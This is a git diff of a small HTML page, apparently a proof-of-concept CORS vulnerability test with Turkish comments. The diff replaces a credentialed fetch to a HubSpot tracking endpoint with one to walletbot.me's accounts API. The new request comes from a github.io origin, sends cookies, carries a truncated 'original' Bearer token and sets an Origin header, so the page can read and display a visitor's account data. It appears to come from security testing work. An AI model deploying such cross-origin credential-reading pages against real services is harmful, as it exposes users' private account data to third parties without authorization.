@@ -1,29 +1,30 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>CORS Test - HubSpot</title>
+    <title>CORS Test - vukuff.github.io</title>
+    <script>
+        async function corsTest() {
+            const url = 'https://walletbot.me/api/v1/accounts/';
+            try {
+                const response = await fetch(url, {
+                    method: 'GET',
+                    credentials: 'include',  // Cookie gönderimi için
+                    headers: {
+                        'Authorization': 'Bearer eyJhbGciOiJIUzI1NiIs...',  // Orijinal token
+                        'Origin': 'https://vukuff.github.io'
+                    }
+                });
+                const data = await response.json();
+                document.getElementById('result').innerText = JSON.stringify(data, null, 2);
+            } catch (error) {
+                document.getElementById('result').innerText = `Hata: ${error.message}`;
+            }
+        }
+    </script>
 </head>
 <body>
-    <h1>HubSpot CORS Zafiyet Testi</h1>
-    <div id="response"></div>
-
-    <script>
-        fetch("https://exceptions-eu1.hubspot.com/frontend/observability/page-tracking/store/?sentry_version=7&sentry_client=raven-js%2F3.19.1&deployable=setup-guide-ui", {
-            method: 'POST',
-            headers: {
-                'Content-Type': 'text/plain',
-                'Accept': 'application/json',
-            },
-            credentials: 'include'  // Çerezleri gönder (eğer API auth kullanıyorsa)
-        })
-        .then(response => response.text())
-        .then(data => {
-            document.getElementById("response").innerText = "API Yanıtı: " + data;
-            console.log(data);
-        })
-        .catch(error => {
-            document.getElementById("response").innerText = "Hata: " + error;
-        });
-    </script>
+    <h1>CORS Testi</h1>
+    <button onclick="corsTest()">İsteği Gönder</button>
+    <pre id="result"></pre>
 </body>
 </html>
